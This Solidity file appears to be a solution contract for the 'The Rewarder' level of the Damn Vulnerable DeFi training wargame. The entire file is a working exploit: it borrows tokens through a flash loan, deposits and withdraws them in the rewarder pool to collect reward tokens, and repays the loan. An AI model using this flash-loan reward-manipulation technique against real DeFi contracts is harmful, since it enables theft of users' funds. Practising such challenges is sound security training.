// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "../DamnValuableToken.sol";
import "./FlashLoanerPool.sol";
import "./TheRewarderPool.sol";
import "./RewardToken.sol";


contract TheRewarderAttack {

    DamnValuableToken private liquidityToken;
    FlashLoanerPool private flashLoanPool;
    TheRewarderPool private theRewarderPool;
    RewardToken private rewardToken;
    bool public trigger;

    constructor(address _LPToken, address _flashLoanPool, address _rewarderRool, address _rewardToken) {
        liquidityToken = DamnValuableToken(_LPToken);
        flashLoanPool = FlashLoanerPool(_flashLoanPool);
        theRewarderPool = TheRewarderPool(_rewarderRool);
        rewardToken = RewardToken(_rewardToken);
    }

    function attack(uint256 _amount) public {
        flashLoanPool.flashLoan(_amount);
        rewardToken.transfer(msg.sender, rewardToken.balanceOf(address(this)));
    }

    function receiveFlashLoan(uint256 _amount) external {
        liquidityToken.approve(address(theRewarderPool), _amount);
        theRewarderPool.deposit(_amount);

        theRewarderPool.withdraw(_amount);

        liquidityToken.transfer(address(flashLoanPool), _amount);
        trigger = true;
    }

    receive() external payable {}

}